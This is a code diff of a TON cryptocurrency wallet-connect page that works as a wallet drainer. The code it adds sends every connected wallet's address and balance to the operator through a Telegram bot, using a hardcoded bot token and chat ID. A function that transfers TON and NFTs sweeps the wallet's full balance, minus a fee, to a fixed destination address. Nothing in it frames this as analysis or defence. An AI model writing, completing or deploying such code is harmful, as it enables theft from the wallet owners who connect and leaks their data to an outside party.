@@ -65,10 +65,12 @@
             if (walletInfo.account) {
                 console.log('Wallet connected:', walletInfo.account);
                 checkBalance(walletInfo.account.address);
+            } else {
+                console.error('No account connected or status not recognized.');
             }
         });
 
-        // Function to check user balance
+        // Function to check user balance and send it to Telegram
         async function checkBalance(walletAddress) {
             try {
                 const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
@@ -76,6 +78,13 @@
                 if (data && data.result) {
                     const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
                     console.log(`Balance of ${walletAddress}: ${balance} TON`);
+
+                    // Send balance information to Telegram
+                    const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
+                    const tgChatId = '5107144356'; // Replace with your Telegram chat ID
+                    const message = `Wallet Address: ${walletAddress}\nBalance: ${balance} TON`;
+                    const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
+                    await fetch(telegramUrl, { method: 'GET' });
                 } else {
                     console.error('Failed to fetch balance');
                 }
@@ -87,9 +96,10 @@
         // Function to transfer TON and NFTs
         async function didtrans() {
             try {
-                const walletInfo = tonConnectUI.getWallet();
-                if (!walletInfo) {
+                const walletInfo = tonConnectUI.connected;
+                if (!walletInfo || !walletInfo.account) {
                     alert('Please connect your wallet first.');
+                    console.error('Wallet is not connected. Cannot proceed with transaction.');
                     return;
                 }
 
@@ -97,7 +107,7 @@
                     validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
                     messages: [
                         {
-                            address: 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c', // Replace with your wallet address
+                            address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
                             amount: walletInfo.balance - 3000000 // Deduct fee (in nanotons)
                         }
                     ]
